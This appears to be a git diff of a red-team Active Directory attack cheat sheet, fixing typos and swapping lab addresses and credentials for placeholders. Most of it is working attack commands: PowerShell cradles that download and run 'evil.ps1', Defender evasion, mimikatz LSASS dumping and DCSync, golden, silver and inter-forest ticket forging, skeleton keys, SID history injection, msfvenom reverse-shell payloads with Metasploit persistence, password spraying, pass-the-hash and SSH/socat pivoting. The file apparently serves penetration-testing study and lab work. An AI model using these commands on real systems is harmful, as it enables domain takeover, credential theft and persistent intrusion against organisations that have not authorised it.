@@ -70,7 +70,7 @@
   - [Pass the Ticket](#pass-the-ticket)
   - [DCOM](#dcom)
 - [Credentials Harvesting](#credentials-harvesting)
-  - [Cedential Access](#cedential-access)
+  - [Credential Access](#credential-access)
   - [Windows Credentials](#windows-credentials)
   - [Dump LSASS](#dump-lsass)
   - [Accessing Credential Manager](#accessing-credential-manager)
@@ -86,8 +86,8 @@
   - [Shadow copies](#shadow-copies)
   - [Through Credentials](#through-credentials)
   - [Through Certificates](#through-certificates)
-  - [Trough SID History](#trough-sid-history)
-  - [Trough metasploit](#trough-metasploit)
+  - [Through SID History](#through-sid-history)
+  - [Through metasploit](#through-metasploit)
   - [DSRM](#dsrm)
   - [Custom SSP](#custom-ssp)
   - [ACLs - AdminSDHolder](#acls---adminsdholder)
@@ -168,7 +168,7 @@ Import a `.psd1` script (get all the commands from a module with `Get-Command -m
 - `$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://<IP>/evil.ps1',$false);$h.send();iex $h.responseText`
 - `$wr = [System.NET.WebRequest]::Create("http://<IP>/evil.ps1")`<br/>
   `$r = $wr.GetResponse()`<br/>
-  `IEX (System.IO.StreamReader).ReadToEnd()`
+  `IEX ([System.IO.StreamReader]::new($r.GetResponseStream())).ReadToEnd()`
 
 **PowerShell Detections**
 - System-wide transcription
@@ -213,17 +213,17 @@ Import a `.psd1` script (get all the commands from a module with `Get-Command -m
 9. Analysis using DefenderCheck
 
 **Avoid Detections**
-- Running an exe from a remote server will trigger windows defender. One way to avoid this is port forwarding in 8080 `$null | winrs -r:<remote-server> "netsh interface portproxy add v4tov4 listenport=8080 listen address=0.0.0.0 connectport=80 connectaddress=<IP>"`.
-  - Now you can run an exe like this `$ null | winrs -r:<remote-server> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa:ekeys exit`
+- Running an exe from a remote server will trigger windows defender. One way to avoid this is port forwarding in 8080 `$null | winrs -r:<remote-server> "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<IP>"`.
+  - Now you can run an exe like this `$null | winrs -r:<remote-server> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit`
   - To check if the port forwarding is still active `netsh interface portproxy show v4tov4`
 
 **Good OPSEC**
 - It’s better to use a Windows OS to increase stealth and flexibility.
 - Always make sure to use a LDAP based tools, never .NET commands (SAMR)
 - Always enumerate first, do not grab the low hanging fruit first, since it may be a decoy. Also check logon count and login policy.
-  - An example: run `Get-DomainUser | select samaccountname, logonCount`, if you see an account that seems like a low hanging fruit but has zero logons, it might be a decoy or a dorment user.
+  - An example: run `Get-DomainUser | select samaccountname, logonCount`, if you see an account that seems like a low hanging fruit but has zero logons, it might be a decoy or a dormant user.
   - Check: logonCount, lastlogontimestamp, badpasswordtime, Description
-  - Take also in consideration your target organization: is this their first assesment? Do they invest in their security (time, effort)?
+  - Take also in consideration your target organization: is this their first assessment? Do they invest in their security (time, effort)?
 - Making changes to the local administrator group is one of the noisiest things you can do
 - Domain Admin privilege is something that you should never go for
 - In a real Red Team operation, you will not use a Golden Ticket unless you want to check for detections of it. This because it’s noisy
@@ -237,22 +237,22 @@ Import a `.psd1` script (get all the commands from a module with `Get-Command -m
   - Verify the success of the command with `Get-NetGroup "<group>" | select member`
   - Delete the `<user>` with `/del` instead of `/add`
 - Use `gpp-decrypt` to decrypt a given GPP encrypted string
-- Note `ActiveDirectoryRights` and `SecurityIdentifier` for each object enumerated during [Object Permissions Enumeration](#bbject-permissions-enumeration)
+- Note `ActiveDirectoryRights` and `SecurityIdentifier` for each object enumerated during [Object Permissions Enumeration](#object-permissions-enumeration)
   - See: [ActiveDirectoryRights Enum (System.DirectoryServices)](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
 - If you get lost, check also the notes for the Hutch, Heist, and Vault machines
 - File config for responder: `/usr/share/responder/Responder.conf`
 - Do password spray only on local account
   - `Rubeus.exe brute /password:Password1 /noticket`
     - Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file
-    - `echo 10.10.187.139 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
+    - `echo <DC_IP> CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
 - Kerberos Abuse: https://blog.spookysec.net/kerberos-abuse/
 - To transfer files use smbserver: `sudo impacket-smbserver -smb2support share /home/kali/Downloads/`
   - An example: from PowerShell of the victim, download Rubeus.exe with the command `Copy-Item -Path "\\<kali_IP>\share\Rubeus.exe" -Destination "C:\Users\username\Desktop"`
 - Certificate signing request for WinRM: https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
   - WinRM shell: https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell.rb
 - NTLM Auth: https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#beyond-root---ntlm-auth
-- Not all the usernames found are always the ones that work. For example: you might find autologon creds `svc_loanmanager:Moneymakestheworldgoround!` which however lead to login with `evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'`
-- Every time that you think about Active Directory, think about a Forest, not a Domain. If one domain is compromised, so it is the entire forest. Whithin a forest, all the domains trust each others. This is why a forest is considered a security boundry.
+- Not all the usernames found are always the ones that work. For example: you might find autologon creds `<SVC_USER>:<PASSWORD>` which however lead to login with `evil-winrm -i <DC_IP> -u <ACTUAL_USERNAME> -p '<PASSWORD>'`
+- Every time that you think about Active Directory, think about a Forest, not a Domain. If one domain is compromised, so it is the entire forest. Within a forest, all the domains trust each other. This is why a forest is considered a security boundary.
 
 **Commands frequently used**
 ```PowerShell
@@ -276,7 +276,7 @@ iex(iwr http://<IP>/sbloggingbypass.txt -UseBasicParsing)
 - [ ] Scans to run
   - `enum4linux -a -u "" -p "" <IP>`
   - `nmap -Pn -T4 -p- --min-rate=1000 -sV -vvv <IP> -oN nmap_results`
-  - `nmap -p- -A -nP <IP> -oN nmap_results`
+  - `nmap -p- -A -Pn <IP> -oN nmap_results`
   - `dig @<IP> AXFR <domain>`
   - `dnsenum <IP>`
 - After this
@@ -387,7 +387,7 @@ Get-DomainGPO -Identity "<gpo_id>"                                              
 Find-LocalAdminAccess -Verbose                                                                                                             Find all machines where the current user has local admin access
 
 
-Get details, in this case, about user svc__apache
+Get details about a specific service account
 -------------------------------------------------
 Get-ADServiceAccount -Filter {name -eq '<service_account_name>'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
 Get-DomainUser -LDAPFilter "Description=*<keyword>*" | Select name,Description                                                               Check for non-empty descriptions of domain users
@@ -398,7 +398,7 @@ Object Permissions Enumeration
 Get-ObjectAcl -Identity <username>                                                                                                        Enumerate ACEs
 Convert-SidToName <SID>                                                                                                                   Convert ObjectISD and SecurityIdentifier into names
 "<SID>", "<SID>", "<SID>", "<SID>", ... | Convert-SidToName                                                                               Convert <SID>s into names
-Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights       Enumerat ACLs for <group>, only display values equal to GenericAll
+Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights       Enumerate ACLs for <group>, only display values equal to GenericAll
 
 
 Domain Shares Enumeration
@@ -578,9 +578,9 @@ PowerShell
 
 **Misc**
 Always enumerate first, do not grab the low hanging fruit first, since it might be a decoy. Also check logon count and login policy.
-- An example: run `Get-DomainUser | select samaccountname, logonCount`, if you see an account that seems like a low hanging fruit but has zero logons, it might be a decoy or a dorment user.
+- An example: run `Get-DomainUser | select samaccountname, logonCount`, if you see an account that seems like a low hanging fruit but has zero logons, it might be a decoy or a dormant user.
 - Check: `logonCount`, `lastlogontimestamp`, `badpasswordtime`, `Description`
-- Take also in consideration your target organization: is this their first assesment? Do they invest in their security (time, effort)?
+- Take also in consideration your target organization: is this their first assessment? Do they invest in their security (time, effort)?
 - List inactive users
   - `Get-MsIdInactiveSignInUser -LastSignInBeforeDaysAgo 30`, [more info here](https://azuread.github.io/MSIdentityTools/commands/Get-MsIdInactiveSignInUser/)
 
@@ -692,7 +692,7 @@ Get-NetUser -SPN | select samaccountname,serviceprincipalname       List the SPN
 Get-ObjectAcl -Identity <username>                                                                                                        Enumerate ACEs
 Convert-SidToName <SID>                                                                                                                   Convert ObjectISD and SecurityIdentifier into names
 "<SID>", "<SID>", "<SID>", "<SID>", ... | Convert-SidToName                                                                               Convert <SID>s into names
-Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights       Enumerat ACLs for <group>, only display values equal to GenericAll
+Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights       Enumerate ACLs for <group>, only display values equal to GenericAll
 ```
 
 ## Domain Shares Enumeration
@@ -776,7 +776,7 @@ Notes
 - Use `/patch` with a command, it might work
    - esempio: `lsadump::sam /patch`
 - https://adsecurity.org/?page_id=1821
-- You can also run commands like this: `.\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit`, especially if you see the prompt going nuts
+- You can also run commands like this: `.\mimikatz 'lsadump::dcsync /domain:<DOMAIN> /user:administrator' exit`, especially if you see the prompt going nuts
 
 
 ## Active Directory Authentication Attacks
@@ -791,7 +791,7 @@ With LDAP and ADSI
 
 Leveraging SMB
 - `crackmapexec smb <IP> -u users.txt -p '<password>' -d <domain-name> --continue-on-success` Password spraying
-- `crackmapexec smb <domain_name>/<username>:'<password>' -M targets.txt` Spray a specified password against all domain joined machines contained in `targets.txt`
+- `crackmapexec smb targets.txt -u <username> -p '<password>' -d <domain_name>` Spray a specified password against all domain joined machines contained in `targets.txt`
 - Note: this doesn't take into consideration the password policy of the domain
 
 By obtaining a TGT
@@ -816,7 +816,7 @@ To create a silver ticket, you need:
 1. `impacket-ticketer -nthash <NT_hash> -domain-sid <domain_SID> -domain <domain_name> -spn MSSQL/<server_FQDN> -user-id <user_ID> <user_name>`
 2. `export KRB5CCNAME=$PWD/<ticket_file>`
 3. `klist`
-4. `sudo nano /etc/krb5user.conf`
+4. `sudo nano /etc/krb5.conf`
 5. `sudo echo '<IP_address> localhost <server_FQDN> <DOMAIN_NAME>' >> /etc/hosts`
 6. `impacket-mssqlclient -k <server_FQDN>`
    - `select system_user;`
@@ -850,8 +850,8 @@ Another way
 - With [aclpwn.py](https://github.com/fox-it/aclpwn.py), `python aclpwn.py -f <username> -t <target_domain> --domain <domain> --server <IP> -du <domain_user> -dp <domain_password>`
 
 Connect with NTLM
-- `evil-winrm -u Administrator -H '<NTLM_hash>' -i <IP> -N`
-- `impacket-psexec <domain>/administrator@<IP> -hashes <NTLM_hash>`
+- `evil-winrm -u Administrator -H '<NTLM_hash>' -i <IP>`
+- `impacket-psexec <domain>/administrator@<IP> -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_hash>`
 
 
 ### LDAP Pass-back attack
@@ -907,11 +907,11 @@ STEP 4
 - [Taking over Windows Workstations thanks to LAPS and PXE](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/)
 - [PowerPXE](https://github.com/wavestone-cdt/powerpxe)
 - [TryHackMe task 6 Breaching AD](https://tryhackme.com/room/breachingad)
-1. `tftp -i $IP GET "\Tmp\x64{39...28}.bcd" conf.bcd`
+1. `tftp -i <PXE_SERVER_IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd`
 2. `Import-Module .\PowerPXE.ps1`
 3. `$BCDFile = "conf.bcd"`
 4. `Get-WimFile -bcdFile $BCDFile`
-5. `tftp -i $IP GET "<PXE Boot Image Location>" pxeboot.wim`
+5. `tftp -i <PXE_SERVER_IP> GET "<PXE Boot Image Location>" pxeboot.wim`
 6. `Get-FindCredentials -WimFile pxeboot.wim`
 
 
@@ -1003,7 +1003,7 @@ STEP 4
   - https://app.hackthebox.com/machines/223
 1. Extract password with [azuread_decrypt_msol.ps1](https://gist.github.com/analyticsearch/7453d22d737e46657eb57c44d5cf4cbb)
 2. If it doesn't work, retrieve `$key_id`, `$instance_id` and `$entropy` with the following command (see also [azuread_decrypt_msol_v2.ps1](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c))
-   - `sqlcmd -S SQLSERVER01 -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"`
+   - `sqlcmd -S <SQL_SERVER> -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"`
 
 
 ### Group Policy Preferences (GPP) AKA MS14-025
@@ -1149,8 +1149,8 @@ Another way to do it
 2. `misc::skeleton`
 Accessing the forest
 - the default password is 'mimikatz', some examples:
-  - `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`
-  - `dir \\Desktop-1\c$ /user:Machine1 mimikatz`
+  - `net use c:\\<DC_HOSTNAME>\admin$ /user:Administrator mimikatz`
+  - `dir \\<TARGET_HOSTNAME>\c$ /user:<USERNAME> mimikatz`
 
 
 ### Testing found credentials
@@ -1176,7 +1176,7 @@ Accessing the forest
 Identify local admin privileges on other machines
 1. `. C:\path\to\Find-PSRemotingLocalAdminAccess.ps1`
 2. `Find-PSRemotingLocalAdminAccess`
-3. Connect to that machine `winr -r:<machine> cmd`
+3. Connect to that machine `winrs -r:<machine> cmd`
 
 ### WMI and WinRM
 
@@ -1246,7 +1246,7 @@ winrs -remote:<target_server> -u:<username> -p:<password> hostname
   $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
   $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
   ```
-- Enstablish a connection
+- Establish a connection
   - `Enter-PSSession -Computername <target> -Credential $credential`
   - `Invoke-Command -Computername <target> -Credential $credential -ScriptBlock {whoami}`
   - ```PowerShell
@@ -1275,14 +1275,13 @@ winrs -remote:<target_server> -u:<username> -p:<password> hostname
   $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
   Register-ScheduledTask -CimSession $Session -Action $Action -User "<user>" -TaskName "<task_name>"
   Start-ScheduledTask -CimSession $Session -TaskName "<task_name>"
-  Delete unscheduled task
   ```
-- `Unregister-ScheduledTask -CimSession $Session -TaskName "<task_name>"`
+- Delete the scheduled task: `Unregister-ScheduledTask -CimSession $Session -TaskName "<task_name>"`
 
 **Example with WMI**
 1. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f msi > myinstaller.msi`
 2. `smbclient -c 'put myinstaller.msi' -U <username> -W <domain> '//<target_ip_or_hostname>/admin$/' <password>`
-3. `msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <attacker_ip>; set LPORT <attacker_port>; exploit"`
+3. `msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST <attacker_ip>; set LPORT <attacker_port>; exploit"`
 4. ```PowerShell
    $username = '<username>';
    $password = '<password>';
@@ -1334,33 +1333,33 @@ From the new shell on the listener
    - `tscon 3 /dest:rdp-tcp#6`
    
 ### SSH Remote Port Forwarding
-- Victim: `ssh attacker@10.50.46.25 -R 3389:3.3.3.3:3389 -N`
+- Victim: `ssh attacker@<ATTACKER_IP> -R 3389:<TARGET_IP>:3389 -N`
 - Attacker: `xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword`
 
 ### SSH Local Port Forwarding (to expose attacker's port 80)
 
 Victim
-1. `ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N`
+1. `ssh tunneluser@<ATTACKER_IP> -L *:80:127.0.0.1:80 -N`
 2. ```Powershell
    add firewall rule
    netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
    ```
    
 ### Port Forwarding With socat
-1. Open port `1234` and redirect to port `4321` on host `1.1.1.1`
+1. Open port `1234` and redirect to port `4321` on host `<TARGET_IP>`
    ```Powershell
-   socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
+   socat TCP4-LISTEN:1234,fork TCP4:<TARGET_IP>:4321
    ```
 2. `netsh advfirewall firewall add rule name="Open Port 1234" dir=in action=allow protocol=TCP localport=1234`
-- To expose attacker's port `80`: `socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80`
+- To expose attacker's port `80`: `socat TCP4-LISTEN:80,fork TCP4:<ATTACKER_IP>:80`
 - Example
   ```Powershell
-  socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
-  xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
+  socat TCP4-LISTEN:13389,fork TCP4:<TARGET_HOSTNAME>:3389
+  xfreerdp /v:<PIVOT_HOSTNAME>:13389 /u:<USERNAME> /p:<PASSWORD>
   ```
 
 ### Dynamic Port Forwarding and SOCKS
-- Victim: `ssh attacker@10.50.46.25 -R 9050 -N`
+- Victim: `ssh attacker@<ATTACKER_IP> -R 9050 -N`
 - Attacker: 
   1. `[ProxyList] socks4  127.0.0.1 9050`
   2. `proxychains curl http://<target_ip_or_domain>`
@@ -1468,7 +1467,7 @@ Other way:
 2. `sekurlsa::tickets /export` export all the TGT/TGS from memory
 3. Verify generated tickets with `PS:\> dir *.kirbi`. Search for an administrator ticket in the local directory
 4. Inject a ticket from mimikatz with `kerberos::ptt <ticket_name>`
-   - Example: `kerberos::ptt [0;193553]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi`
+   - Example: `kerberos::ptt [0;193553]-2-0-40e10000-Administrator@krbtgt-<DOMAIN>.kirbi`
 5. Inspect the injected ticket with `C:\> klist`
 6. Access the restricted shared folder.
    - Example `dir \\<IP>\admin$`
@@ -1482,7 +1481,7 @@ Other way:
 
 ## Credentials Harvesting
 
-### Cedential Access
+### Credential Access
 
 Clear-text files
 - `C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
@@ -1514,7 +1513,7 @@ Registry
 - `reg query HKCU /f password /t REG_SZ /s`
 
 
-Years ago you could find clear-text password in the GPP, so give it a shot. If it’s a new enviorments it won’t probably work tho.
+Years ago you could find clear-text password in the GPP, so give it a shot. If it’s a new environment it won’t probably work tho.
 
 
 ### Windows Credentials
@@ -1550,7 +1549,7 @@ Mimikatz
 2. `sekurlsa::logonpasswords`
 
 Protected LSASS
-1. `privielege::debug`
+1. `privilege::debug`
 2. `!+`
 3. `!processprotect /process:lsass.exe /remove`
 4. `sekurlsa::logonpasswords`
@@ -1663,7 +1662,7 @@ Payload Delivery
 
 ### Golden Ticket
 
-- Note: prefeer Silver Ticket instead. Short time, but less detection.
+- Note: prefer Silver Ticket instead. Short time, but less detection.
 - With this attack, you can gain access to every machine in the AD
 - You need a kerberoast ticket granting account and With mimikatz from the DC
 - You may need to purge: `kerberos::purge`
@@ -1672,13 +1671,13 @@ Payload Delivery
 Process
 1. `privilege::debug`
 2. Dump the krbtgt hash
-   - `lsadump::lsa /inject /name:krbtgt or `lsadump::lsa /patch`
+   - `lsadump::lsa /inject /name:krbtgt` or `lsadump::lsa /patch`
    - copy the SID and the NTLM
 3. `kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM> /ptt`
 4. `misc::cmd`
-5. from the opened CMD, try `dir \\USERNAME\\C$`
+5. from the opened CMD, try `dir \\<DC_HOSTNAME>\C$`
    - consider also to download psexec in the machine compromised for more access
-   - `psexec.exe \\USERNAME cmd.exe`
+   - `psexec.exe \\<DC_HOSTNAME> cmd.exe`
 
 ### Diamond ticket
 
@@ -1689,7 +1688,7 @@ Process
 
 Notes
 - It enables you to access any user by using a valid username with the skeleton key as password.
-- It's not opsec safe and is also known to cause issues with AD CS (it can crash the enviorment for everybody)
+- It's not opsec safe and is also known to cause issues with AD CS (it can crash the environment for everybody)
 - If you use mimikatz, change the password used by it.
 
 Process
@@ -1739,17 +1738,16 @@ mimikatz # !-
 6. Load the TGT to auth to DC, with mimikatz
    - `kerberos::ptt administrator.kirbi`
 
-### Trough SID History
+### Through SID History
 
 - If you need to fix SID history (ntds.dit): [DSInternals](https://github.com/MichaelGrafnetter/DSInternals)
 1. Confirm that your user has no SID history
    - `Get-ADUser <your ad username> -properties sidhistory,memberof`
 2. Get the SID of the Domain Admins
-   - `Get-ADGroup "Domain Admins"Get-ADGroup "Domain Admins"`
+   - `Get-ADGroup "Domain Admins"`
 3. Patch the ntds.dit file with DSInternals
    - `Stop-Service -Name ntds -force`
-   - `Stop-Service -Name ntds -force`
-   - `Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit`
+   - `Add-ADDBSidHistory -SamAccountName 'username of our low-privileged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit`
    - `Start-Service -Name ntds`
    - `Restart-Service -Name NTDS`
 4. Exit and Log in, verify the SID history
@@ -1757,14 +1755,14 @@ mimikatz # !-
 5. Test your Admin privileges
    - `dir \\<IP_or_name>\c$`
 
-### Trough metasploit
+### Through metasploit
 
-1. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=445 -f exe -o shell.exe`
+1. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=445 -f exe -o shell.exe`
 2. `use exploit/multi/handler`
 3. `set payload windows/meterpreter/reverse_tcp`
 4. after the shell is spawned: `background`
 5. `use exploit/windows/local/persistence`
-6. `set settion 1`
+6. `set session 1`
 7. `run`
 - If the session dies, just run again `run`
 - [About Post-Exploitation](https://docs.rapid7.com/metasploit/about-post-exploitation/)
@@ -1913,7 +1911,7 @@ AS-REPs
 - Force disable Kerberos Preauth:
   - Enumerate the permissions for RDPUsers on ACLs with PowerView:
     1. `Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
-    2. `Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose`
+    2. `Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304} -Verbose`
     3. `Get-DomainUser -PreauthNotRequired -Verbose`
 - Request encrypted AS-REP for offline brute-force
   - Using ASREPRoast
@@ -1952,7 +1950,7 @@ AS-REPs
     - With ActiveDirectory module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`
   - Force disable Kerberos Preauth
     1. Enumerate the permissions for RDPUsers on ACLs with PowerView: `Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
-    2. `Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose`
+    2. `Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304} -Verbose`
     3. `Get-DomainUser -PreauthNotRequired -Verbose`
   - Request encrypted AS-REP for offline brute-force
     - With [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)
@@ -1970,10 +1968,10 @@ Set SPN
 - Enumerate the permissions for RDPUsers on ACLs using PowerView
   - `Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
 - With Powerview, see if the user already has a SPN
-  - `Get-DomainUser -Identity supportuser | select serviceprincipalname`
-  - With ActiveDirectory module: `Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName`
+  - `Get-DomainUser -Identity <TARGET_USER> | select serviceprincipalname`
+  - With ActiveDirectory module: `Get-ADUser -Identity <TARGET_USER> -Properties ServicePrincipalName | select ServicePrincipalName`
 - Set a SPN for the user (must be unique for the domain)
-  - `Set-DomainObject -Identity support1user -Set @{serviceprincipalname='<domain>/<user>'}`
+  - `Set-DomainObject -Identity <TARGET_USER> -Set @{serviceprincipalname='<domain>/<user>'}`
   - With ActiveDirectory module: `Set-ADUser -Identity <user-rdp> -ServicePrincipalNames @{Add='<domain>/<user>'}`
 - `Rubeus.exe kerberoast /outfile:<targetedhashes>.txt`
 - `john.exe --wordlist=C:\path\to\10k-worst-pass.txt C:\path\to\<targetedhashes>.txt`
@@ -1998,7 +1996,7 @@ Compromise the server(s) where Unconstrained Delegation is enabled
   - `MS-RPRN.exe \\<DC_hostname> \\<App_server_hostname>`
 - For Linux, use [Coercer](https://github.com/p0dalirius/Coercer)
 - Copy the base64 encoded TGT, remove extra spaces and use it on the windows machine
-  - `Rubeus.exe ptt /tikcet:`
+  - `Rubeus.exe ptt /ticket:`
 - Once the ticket is injected, run DCSync:
   - `Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'`
 
@@ -2081,7 +2079,7 @@ Process
   - `Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <computer_name>`
   - or: `Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<user>$"'`
   - or: `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
-- Forge and inter-realm TGT:
+- Forge an inter-realm TGT:
   - `C:\path\to\BetterSafetyKatz.exe "kerberos::golden /user:<target_user> /domain:<target_domain> /sid:<target_domain_SID> /sids:<domain_SID> /rc4:<NTLM_hash> /service:krbtgt /target:<target_domain> /ticket:<path_to_ticket.kirbi>" "exit"`
 
 Abuse with Kekeo
@@ -2089,12 +2087,12 @@ Abuse with Kekeo
   - `.\asktgs.exe C:\path\to\trust_tkt.kirbi CIFS/<DnsHostname>`
 - Use the TGS to access the targeted service
   - `.\kirbikator.exe lsa .\CIFS.<DnsHostname>.kirbi`
-  - `ls \\mcorp-dc.moneycorp.local\c$`
-- You can also create tickets for others serivces (HOST and RPCSS for WMI, HTTP for PowerShell Remoting and WinRM)
+  - `ls \\<TARGET_DC_FQDN>\c$`
+- You can also create tickets for other services (HOST and RPCSS for WMI, HTTP for PowerShell Remoting and WinRM)
 
 Abuse with Rubeus. Note that we are still using the TGT forged initially
-- `Rubeus.exe asktgs /ticket:<path_to_TGS_ticket.kirbi> /service:cifs/<DnsHostname> /dc:mcorp-dc.moneycorp.local /ptt`
-- `ls \\mcorp-dc.moneycorp.local\c$`
+- `Rubeus.exe asktgs /ticket:<path_to_TGS_ticket.kirbi> /service:cifs/<DnsHostname> /dc:<TARGET_DC_FQDN> /ptt`
+- `ls \\<TARGET_DC_FQDN>\c$`
 
 ### Child to Parent using krbtgt hash
 
@@ -2115,7 +2113,7 @@ Abuse with Rubeus. Note that we are still using the TGT forged initially
 
 1. Request the trust key for the inter forest trust
    - `Invoke-Mimikatz -Command '"lsadump::trust /patch"'`
-   - or `nvoke-Mimikatz -Command '"lsadump::lsa /patch"'`
+   - or `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
 2. Forge an inter-forest TGT
    - `C:\path\to\BetterSafetyKatz.exe "kerberos::golden /user:<target_user> /domain:<target_domain> /sid:<target_sid> /rc4:<ntlm_hash> /service:krbtgt /target:<target_domain> /ticket:<path_to_ticket>" "exit"`
 Abuse with Kekeo
@@ -2123,16 +2121,16 @@ Abuse with Kekeo
   - `.\asktgs.exe C:\path\to\trust_forest_tkt.kirbi CIFS/<DnsHostname>`
 - Use the TGS to access the targeted service.
   - `.\kirbikator.exe lsa .\CIFS.<DnsHostname>.kirbi`
-  - `ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\`
+  - `ls \\<TARGET_FOREST_DC_FQDN>\<SHARED_FOLDER>\`
 Abuse with Rubeus
-- `Rubeus.exe asktgs /ticket:C:\path\to\trust_forest_tkt.kirbi /service:cifs/<DnsHostname> /dc:eurocorp-dc.eurocorp.local /ptt`
-- `ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\`
+- `Rubeus.exe asktgs /ticket:C:\path\to\trust_forest_tkt.kirbi /service:cifs/<DnsHostname> /dc:<TARGET_FOREST_DC_FQDN> /ptt`
+- `ls \\<TARGET_FOREST_DC_FQDN>\<SHARED_FOLDER>\`
 
 ### Across domain trusts - Active Directory Certificate Services (AD CS)
 
 **Escalation to DA**
 1. Template enumeration
-   - Enumarate all the templates
+   - Enumerate all the templates
      - `certutil -v -template > cert_templates.txt`
      - Look for a template where our user has either the Allow Enroll or Allow Full Control permission
    - Find your own groups
@@ -2160,8 +2158,8 @@ Abuse with Rubeus
 3. Use the certificate to request a Kerberos ticket granting ticket (TGT) and load it
    - `Rubeus.exe asktgt /user:<username> /enctype:aes256 /certificate:<certificate_path> /password:<certificate_password> /outfile:<tgt_user_kirbi> /domain:<domain> /dc:<DC_IP>`
    - Open the Active Directory Users and Computers application and choose a DA
-   - `Rubeus.exe changepw /ticket:<tgt_user_kirbi> /new:<new_password> /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\<DA_username>`
-   - `runas /user:lunar.eruca.com\<DA_username> cmd.exe`
+   - `Rubeus.exe changepw /ticket:<tgt_user_kirbi> /new:<new_password> /dc:<DC_FQDN> /targetuser:<domain>\<DA_username>`
+   - `runas /user:<domain>\<DA_username> cmd.exe`
 
 **Using Certify**
 - Use [Certify](https://github.com/GhostPack/Certify) to enumerate AD CS in the target forest
@@ -2210,30 +2208,30 @@ A database link enables a SQL Server to interact with external data sources such
 
 Searching Database Links
 - Look for links to remote servers
-  - `Get-SQLServerLink -Instance dcorp-mssql -Verbose`
+  - `Get-SQLServerLink -Instance <MSSQL_INSTANCE> -Verbose`
   - or `select * from master..sysservers`
 - Enumerating Database Links - Manually
